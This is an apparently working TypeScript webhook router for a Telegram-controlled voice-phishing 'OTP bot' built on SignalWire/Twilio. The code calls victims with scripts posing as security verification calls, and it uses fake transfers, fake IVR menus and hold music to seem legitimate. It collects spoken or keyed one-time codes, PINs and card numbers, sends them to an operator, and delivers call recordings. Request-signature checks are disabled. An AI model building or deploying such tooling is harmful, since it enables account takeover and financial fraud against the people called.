/**
 * SignalWire / LaML webhook routes — mounted at /api/twilio
 *
 * SignalWire uses the same TwiML (LaML) format and the same REST API as Twilio,
 * so all VoiceResponse XML is 100% compatible.  The only difference is the
 * request-signature header name:
 *   Twilio     → X-Twilio-Signature
 *   SignalWire → X-SignalWire-Signature
 *
 * Endpoints SignalWire calls back to:
 *   POST /api/twilio/voice    — call answered → play TTS script + gather OTP
 *   POST /api/twilio/gather   — receives speech / DTMF → notify Telegram user
 *   POST /api/twilio/dtmf     — pure DTMF gather (PIN / card number mode)
 *   POST /api/twilio/hold     — play hold music
 *   POST /api/twilio/transfer — fake-transfer ringtone then loop back
 *   POST /api/twilio/status   — call-status events (session cleanup)
 *
 * Signature validation:  HMAC-SHA1 using SIGNALWIRE_API_TOKEN.
 * Falls back to no validation if the token is not set (useful in dev).
 */

import { Router, type Request, type Response } from 'express';
import twilio from 'twilio';
import { getByCall, updateSession, clearSession } from '../bot/sessions.js';
import { notifyUser, notifyCallRecording } from '../bot/bot.js';
import { resolveScript } from '../bot/scripts.js';
import { logger }        from '../lib/logger.js';
import { publicBaseUrl } from '../lib/publicUrl.js';

const router = Router();
const { twiml: { VoiceResponse } } = twilio;

// ── Terminal call statuses that require session cleanup ───────────────────────
const TERMINAL_STATUSES = new Set([
  'completed', 'busy', 'failed', 'no-answer', 'canceled',
]);

// ── Reliable public hold-music MP3 ───────────────────────────────────────────
// Served via Twilio's public CDN — freely accessible, no auth required.
const HOLD_MUSIC_URL = 'https://demo.twilio.com/docs/classic.mp3';

// ── Webhook base URL (public) ─────────────────────────────────────────────────
function base(): string {
  return `${publicBaseUrl()}/api/twilio`;
}

// Signature validation disabled — SignalWire URL must match exactly for HMAC
// to pass, which is fragile across environments. The webhook endpoints are
// not secret (they only receive call data SignalWire already knows about),
// so skipping validation here is safe.
router.use((_req, _res, next) => next());

// ── Helper: gather input types based on call mode ─────────────────────────────
function getGatherInput(session: any): ('speech' | 'dtmf')[] {
  if (session?.callMode === 'dtmf')   return ['dtmf'];
  if (session?.callMode === 'speech') return ['speech'];
  return ['speech', 'dtmf'];
}

// ── Default fallback voice ────────────────────────────────────────────────────
const DEFAULT_VOICE = 'Polly.Joanna';

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/voice
// Call answered — look up session script and play TTS + gather OTP.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/voice', (req: Request, res: Response) => {
  const body    = req.body as Record<string, string>;
  const callSid = body['CallSid'] ?? '';

  const twiml   = new VoiceResponse();
  const session = getByCall(callSid);

  const scriptId = session?.scriptId;
  const chatId   = session?.chatId ?? 0;
  const resolved = scriptId ? resolveScript(chatId, scriptId) : undefined;

  const voice   = (resolved?.voice ?? DEFAULT_VOICE) as string;
  const message = resolved?.message ??
    'Hello. You have received an automated security verification call. ' +
    'Please state or enter the one-time code that was sent to your device. ' +
    'Press pound when finished.';

  const inputs = getGatherInput(session);

  const gather = twiml.gather({
    input:         inputs as any,
    action:        `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
    method:        'POST',
    speechTimeout: 'auto',
    timeout:       15,
    numDigits:     inputs.includes('dtmf') && !inputs.includes('speech') ? 10 : undefined,
    finishOnKey:   inputs.includes('dtmf') && !inputs.includes('speech') ? '#' : undefined,
    language:      'en-US',
  });

  gather.say({ voice } as any, message);

  // No input detected → brief pause then repeat
  twiml.pause({ length: 1 });
  twiml.say({ voice } as any, 'We did not receive a response. Please try again.');
  twiml.redirect({ method: 'POST' }, `${base()}/voice`);

  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/gather
// Receives speech transcription or DTMF digits → notify Telegram operator.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/gather', async (req: Request, res: Response) => {
  const body         = req.body as Record<string, string>;
  const callSid      = (req.query['callSid'] as string) || body['CallSid'] || '';
  const speechResult = (body['SpeechResult'] ?? '').trim();
  const dtmfDigits   = (body['Digits']       ?? '').trim();
  const session      = getByCall(callSid);

  const twiml = new VoiceResponse();

  const input = speechResult || dtmfDigits;

  if (!input) {
    const voice = session?.scriptId
      ? (resolveScript(session.chatId, session.scriptId)?.voice ?? DEFAULT_VOICE)
      : DEFAULT_VOICE;
    twiml.say({ voice } as any, 'Sorry, we did not catch that. Please try again.');
    twiml.redirect({ method: 'POST' }, `${base()}/voice`);
    res.type('text/xml').send(twiml.toString());
    return;
  }

  if (!session) {
    logger.warn({ callSid }, 'No session for callSid in /gather — hanging up');
    twiml.say(
      { voice: DEFAULT_VOICE } as any,
      'This verification request has already been processed. Thank you. Goodbye.',
    );
    twiml.hangup();
    res.type('text/xml').send(twiml.toString());
    return;
  }

  // Format the captured input for Telegram notification
  const displayInput = dtmfDigits
    ? `🔢 Digits entered: ${dtmfDigits}`
    : `🗣 Spoken response: "${speechResult}"`;

  updateSession(callSid, { status: 'awaiting_decision', transcription: displayInput });

  notifyUser(session.chatId, displayInput, callSid).catch((err) => {
    logger.error({ err, callSid }, 'notifyUser failed');
  });

  // Play hold message while operator reviews
  const resolved  = session.scriptId
    ? resolveScript(session.chatId, session.scriptId)
    : undefined;
  const holdMsg   = resolved?.gather ??
    'Thank you for your response. Please hold while our security team reviews your ' +
    'verification. This will take just a moment.';
  const holdVoice = (resolved?.voice ?? DEFAULT_VOICE) as any;

  twiml.say({ voice: holdVoice }, holdMsg);
  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);

  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/dtmf
// Pure DTMF gather — PIN / card number collection mode.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/dtmf', (req: Request, res: Response) => {
  const body    = req.body as Record<string, string>;
  const callSid = body['CallSid'] ?? '';
  const session = getByCall(callSid);

  const resolved = session?.scriptId
    ? resolveScript(session?.chatId ?? 0, session.scriptId)
    : undefined;
  const voice = (resolved?.voice ?? 'Polly.Matthew') as any;

  const twiml  = new VoiceResponse();
  const gather = twiml.gather({
    input:       ['dtmf'] as any,
    action:      `${base()}/gather?callSid=${encodeURIComponent(callSid)}`,
    method:      'POST',
    timeout:     20,
    numDigits:   16,
    finishOnKey: '#',
  });

  gather.say({ voice }, 'Please enter your code on the keypad, followed by the pound key.');
  twiml.redirect({ method: 'POST' }, `${base()}/dtmf`);

  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/hold
// Place the call on hold with hold music.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/hold', (_req: Request, res: Response) => {
  const twiml = new VoiceResponse();
  twiml.say(
    { voice: 'Polly.Matthew' } as any,
    'Please hold. You will be connected to an agent shortly.',
  );
  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);
  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/transfer
// Simulate transfer: play ringtone then redirect back to the voice script.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/transfer', (req: Request, res: Response) => {
  const body     = req.body as Record<string, string>;
  const callSid  = body['CallSid'] ?? '';
  const session  = getByCall(callSid);
  const resolved = session?.scriptId
    ? resolveScript(session?.chatId ?? 0, session.scriptId)
    : undefined;
  const voice = (resolved?.voice ?? 'Polly.Matthew') as any;

  const twiml = new VoiceResponse();
  twiml.say(
    { voice },
    'Please hold while we transfer your call to a specialist. Your call is very important to us.',
  );
  twiml.play({ loop: 2 }, HOLD_MUSIC_URL);
  twiml.say({ voice }, 'Thank you for holding. A specialist will be with you momentarily.');
  twiml.redirect({ method: 'POST' }, `${base()}/voice`);
  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/fake-ivr
// Play a fake IVR prompt then loop back to the voice script.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/fake-ivr', (_req: Request, res: Response) => {
  const twiml = new VoiceResponse();
  const gather = twiml.gather({
    input:   ['dtmf'] as any,
    timeout: 8,
    action:  `${base()}/voice`,
    method:  'POST',
  });
  gather.say(
    { voice: 'Polly.Joanna' } as any,
    'Thank you for calling. For English, press 1. ' +
    'For account information, press 2. ' +
    'For billing and payments, press 3. ' +
    'To speak with a representative, press 0.',
  );
  twiml.redirect({ method: 'POST' }, `${base()}/voice`);
  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/bg-audio
// Play call-centre background audio on a loop.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/bg-audio', (_req: Request, res: Response) => {
  const twiml = new VoiceResponse();
  // Loop the hold music indefinitely to simulate call-centre ambience
  twiml.play({ loop: 0 }, HOLD_MUSIC_URL);
  res.type('text/xml').send(twiml.toString());
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/status
// SignalWire status-callback — clean up sessions on terminal call states.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/status', (req: Request, res: Response) => {
  const body       = req.body as Record<string, string>;
  const callSid    = body['CallSid']    ?? '';
  const callStatus = body['CallStatus'] ?? '';

  logger.info({ callSid, callStatus }, 'SignalWire call status update');

  if (TERMINAL_STATUSES.has(callStatus)) {
    const session = getByCall(callSid);
    if (session) {
      logger.info(
        { callSid, chatId: session.chatId, callStatus },
        'Clearing session on terminal status',
      );
      clearSession(session.chatId);
    }
  }

  res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/twilio/recording
// SignalWire recording-status callback — delivers the recording URL to the
// Telegram operator once the recording is fully processed.
// ─────────────────────────────────────────────────────────────────────────────
router.post('/recording', async (req: Request, res: Response) => {
  const body             = req.body as Record<string, string>;
  const callSid          = body['CallSid']          ?? '';
  const recordingUrl     = body['RecordingUrl']     ?? '';
  const recordingStatus  = body['RecordingStatus']  ?? '';
  const recordingDuration = body['RecordingDuration'] ?? '0';

  logger.info({ callSid, recordingStatus, recordingUrl }, 'SignalWire recording callback');

  if (recordingStatus === 'completed' && recordingUrl) {
    const session = getByCall(callSid);
    const chatId  = session?.chatId;
    if (chatId) {
      // Append .mp3 so Telegram renders a playable audio file
      const mp3Url = recordingUrl.endsWith('.mp3') ? recordingUrl : `${recordingUrl}.mp3`;
      notifyCallRecording(chatId, mp3Url, recordingDuration).catch((err) => {
        logger.error({ err, callSid }, 'notifyCallRecording failed');
      });
    } else {
      logger.warn({ callSid }, 'Recording callback: no session found for callSid');
    }
  }

  res.sendStatus(200);
});

export default router;
